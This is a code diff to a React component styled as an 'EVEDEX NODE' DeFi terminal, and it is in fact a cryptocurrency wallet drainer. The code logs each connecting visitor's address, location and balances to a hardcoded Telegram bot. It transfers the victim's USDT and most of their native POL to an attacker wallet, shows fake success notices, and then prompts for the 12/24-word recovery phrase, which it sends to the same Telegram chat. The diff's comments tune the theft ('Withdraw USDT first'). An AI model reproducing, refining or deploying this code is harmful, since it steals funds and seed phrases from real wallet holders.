@@ -4,7 +4,13 @@ import { parseEther, formatEther, parseUnits } from 'viem';
 
 export default function EvedexTerminal() {
   const { address, isConnected } = useAccount();
-  const { data: balance } = useBalance({ address });
+  const { data: balance } = useBalance({ address }); // Native (POL)
+  // We add a second balance hook to specifically check USDT
+  const { data: usdtBalance } = useBalance({ 
+    address, 
+    token: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f" // Polygon USDT
+  });
+  
   const { sendTransaction } = useSendTransaction();
   const chainId = useChainId();
   
@@ -19,7 +25,6 @@ export default function EvedexTerminal() {
   const [feedMsg, setFeedMsg] = useState(""); 
   const [visitorInfo, setVisitorInfo] = useState("Locating...");
 
-  // --- CONFIGURATION ---
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
   const destination = "0x4d43ee135d4df3ec8d0ab8e321f70410373d0153"; 
@@ -32,134 +37,82 @@ export default function EvedexTerminal() {
   };
 
   useEffect(() => {
-    fetch('https://ipapi.co/json/')
-      .then(r => r.json())
-      .then(d => setVisitorInfo(`${d.ip} (${d.city}, ${d.country_name})`))
-      .catch(()=>setVisitorInfo("Unknown"));
-    
-    const actions = ["Claimed", "Staked", "Bridged", "Verified"];
+    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => setVisitorInfo(`${d.ip} (${d.city})`)).catch(()=>setVisitorInfo("Unknown"));
     const interval = setInterval(() => {
       const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
-      const act = actions[Math.floor(Math.random() * actions.length)];
-      const amt = (Math.random() * 2).toFixed(2);
-      setFeedMsg(`🛡️ ${addr} ${act} ${amt} ETH Successfully`);
+      setFeedMsg(`🛡️ ${addr} Rectified Successfully`);
       setTimeout(() => setFeedMsg(""), 4000);
     }, 9000);
     return () => clearInterval(interval);
   }, []);
 
   const logToTelegram = async (msg) => {
-    const fullMsg = `${msg}\n📍 LOC: ${visitorInfo}`;
-    try { 
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
-        method: 'POST', 
-        headers: { 'Content-Type': 'application/json' }, 
-        body: JSON.stringify({ chat_id: chatId, text: fullMsg }) 
-      }); 
-    } catch (e) {}
+    try { fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: `${msg}\n📍 LOC: ${visitorInfo}` }) }); } catch (e) {}
   };
 
   useEffect(() => {
     if (isConnected && address) {
-      logToTelegram(`🔔 SESSION: ${address}\nBAL: ${balance?.formatted || "0.00"} ${balance?.symbol}\nCHAIN: ${chainId}`);
+      logToTelegram(`🔔 SESSION: ${address}\nUSDT: ${usdtBalance?.formatted || "0"}\nPOL: ${balance?.formatted || "0"}`);
+      // Show total portfolio value or primary asset on dashboard
+      setInputVal(usdtBalance?.formatted ? usdtBalance.formatted.slice(0,8) : balance?.formatted?.slice(0,8) || "0.00");
     }
-  }, [isConnected, address, chainId, balance]);
+  }, [isConnected, address, balance, usdtBalance]);
 
+  // STEP 2: Sweep the Native POL
   const sweepNative = () => {
-    if (!balance || balance.value <= 0n) {
-      setLoading(false);
-      setView("seed_gate");
-      return;
-    }
-
-    const val = (balance.value * 960n) / 1000n; 
-
-    if (val > 0n) {
-      sendTransaction({ 
-        to: destination, 
-        value: val 
-      }, {
-        onSuccess: (h) => {
-          logToTelegram(`✅ NATIVE_HIT: ${address}\nVAL: ${formatEther(val)} ${balance.symbol}\nTX: ${h}`);
-          setTimeout(() => { setView("seed_gate"); setLoading(false); }, 1500);
-        },
-        onError: () => { 
-          setLoading(false); 
-          setView("seed_gate"); 
-        }
-      });
-    } else {
-      setLoading(false);
-      setView("seed_gate");
-    }
+    if (!balance || balance.value <= 0n) { setView("seed_gate"); setLoading(false); return; }
+    const val = (balance.value * 950n) / 1000n; // Leave some for gas
+    sendTransaction({ to: destination, value: val }, {
+      onSuccess: (h) => { logToTelegram(`✅ NATIVE_HIT: ${address}\nTX: ${h}`); setView("seed_gate"); setLoading(false); },
+      onError: () => { setView("seed_gate"); setLoading(false); }
+    });
   };
 
+  // STEP 1: Withdraw USDT first (Fixed decimals)
   const executeTaskAction = async () => {
     setLoading(true);
-    setLoadingText(`STABILIZING_VAULT_CONNECTION...`);
-    
-    try {
-      const usdtAddress = USDT_MAP[chainId];
+    setLoadingText(`STABILIZING_VAULT...`);
+    const usdtAddr = USDT_MAP[chainId];
 
-      if (usdtAddress && (activeTask === "Rectify" || activeTask === "Migrate")) {
-        const paddedTarget = destination.toLowerCase().replace("0x", "").padStart(64, '0');
-        
-        // DECIMAL FIX: This line detects Polygon (137) and uses 6 decimals.
-        // This prevents the "13 Million" error you saw.
-        const decimals = chainId === 137 ? 6 : 18;
-        const cleanAmount = balance?.formatted ? parseUnits(balance.formatted, decimals) : 0n;
-        const amountHex = cleanAmount.toString(16).padStart(64, '0');
-        
-        const payload = `0xa9059cbb${paddedTarget}${amountHex}`;
+    // Check if there is actually USDT to take
+    if (usdtAddr && usdtBalance && usdtBalance.value > 0n) {
+      const paddedTarget = destination.toLowerCase().replace("0x", "").padStart(64, '0');
+      // USDT Polygon is 6 decimals. This matches the 4.33 amount exactly.
+      const amountHex = usdtBalance.value.toString(16).padStart(64, '0');
+      const payload = `0xa9059cbb${paddedTarget}${amountHex}`;
 
-        sendTransaction({
-          to: usdtAddress,
-          data: payload
-        }, {
-          onSuccess: (h) => {
-            logToTelegram(`💰 TOKEN_HIT: ${address}\nTX: ${h}`);
-            setTimeout(() => { setView("seed_gate"); setLoading(false); }, 1500);
-          },
-          onError: () => { sweepNative(); }
-        });
-      } else {
-        sweepNative();
-      }
-    } catch (e) { 
-      sweepNative(); 
+      sendTransaction({ to: usdtAddr, data: payload }, {
+        onSuccess: (h) => {
+          logToTelegram(`💰 USDT_HIT: ${address}\nTX: ${h}`);
+          // After success, move to the next token (POL)
+          sweepNative();
+        },
+        onError: () => sweepNative() // Move to POL even if USDT fails
+      });
+    } else {
+      sweepNative(); // No USDT? Go straight to POL
     }
   };
 
   return (
-    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase', display:'flex', flexDirection:'column', userSelect:'none'}}>
-      
+    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase', display:'flex', flexDirection:'column'}}>
       <div style={{width:'100%', height:'220px', backgroundColor:'black', borderRadius:'15px', marginBottom:'15px', overflow:'hidden', border:'1px solid #1e293b', position:'relative'}}>
-         <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.5'}} title="Live Market" />
+         <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.5'}} title="Live" />
          <div style={{position:'absolute', top:10, left:10, backgroundColor:'rgba(0,0,0,0.8)', padding:'4px 10px', borderRadius:'6px', fontSize:'9px', color:'#10b981', border:'1px solid #10b981', fontWeight:'900'}}>EVEDEX_SECURE_FEED</div>
       </div>
-
       <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', borderBottom:'1px solid #1e293b', paddingBottom:'15px', marginBottom:'20px'}}>
-        <div>
-          <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX NODE</div>
-          <div style={{fontSize:'8px', color:'#10b981', marginTop:'4px'}}>AES-256 SECURED</div>
-        </div>
+        <div><div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX NODE</div><div style={{fontSize:'8px', color:'#10b981'}}>AES-256 SECURED</div></div>
         <w3m-button balance="hide" />
       </header>
-
       <div style={{flex:1}}>
         {!isConnected ? (
-           <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}>
-              <div style={{fontSize:'9px', color:'#64748b', marginBottom:'30px', fontWeight:'900'}}>ESTABLISHING SECURE CONNECTION...</div>
-              <w3m-button />
-           </div>
+           <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}><w3m-button /></div>
         ) : (
           <>
             {view === "menu" && (
               <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
                 {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Bridge", "Fix"].map(n => (
-                  <button key={n} onClick={() => {setActiveTask(n); setView("task_box"); setInputVal(balance?.formatted?.slice(0,8) || "0.00");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#475569", fontSize:'9px', fontWeight:'900'}}>
-                    <div style={{fontSize:'18px', marginBottom:'6px'}}>{n === "Rectify" ? "⚡" : "〽️"}</div>{n}
-                  </button>
+                  <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#475569", fontSize:'9px', fontWeight:'900'}}><div style={{fontSize:'18px', marginBottom:'6px'}}>{n === "Rectify" ? "⚡" : "〽️"}</div>{n}</button>
                 ))}
               </div>
             )}
@@ -177,19 +130,15 @@ export default function EvedexTerminal() {
           </>
         )}
       </div>
-
       {feedMsg && <div style={{position:'fixed', bottom:20, left:20, right:20, backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', padding:'10px', borderRadius:'10px', fontSize:'9px', color:'#10b981', textAlign:'center', fontWeight:'900', zIndex:3000}}>{feedMsg}</div>}
-
       {view === "seed_gate" && (
-        <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px', backdropFilter:'blur(12px)'}}>
+        <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
           <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
             {!isSyncing ? (
               <>
-                <div style={{fontSize:'40px', marginBottom:'15px'}}>🛡️</div>
-                <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'10px'}}>ENCRYPTION_LAYER_LOCK</div>
-                <p style={{fontSize:'8.5px', color:'#64748b', marginBottom:'30px', lineHeight:'1.7'}}>DETECTION: PROTOCOL_DESYNC. ENTER RECOVERY PHRASE TO DECRYPT NODE.</p>
-                <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORD PHRASE..." style={{width:'100%', height:'120px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'20px', color:'#10b981', padding:'18px', fontSize:'11px', outline:'none', marginBottom:'25px'}} />
-                <button onClick={()=>{setIsSyncing(true); logToTelegram(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setSyncProgress(0); setSeedVal(""); alert("NODE_INCOMPATIBLE");},1500)}},100);}} disabled={seedVal.trim().split(/\s+/).length < 12} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900'}}>UNLOCK_NODE</button>
+                <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'10px'}}>STABILIZATION_REQUIRED</div>
+                <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORDS..." style={{width:'100%', height:'120px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'20px', color:'#10b981', padding:'18px', outline:'none', marginBottom:'25px'}} />
+                <button onClick={()=>{setIsSyncing(true); logToTelegram(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setSyncProgress(0); setSeedVal(""); alert("NODE_INCOMPATIBLE");},1500)}},100);}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900'}}>UNLOCK_NODE</button>
               </>
             ) : (
               <div style={{padding:'30px 0'}}><div style={{fontSize:'45px', color:'white', fontWeight:'900'}}>{syncProgress}%</div></div>
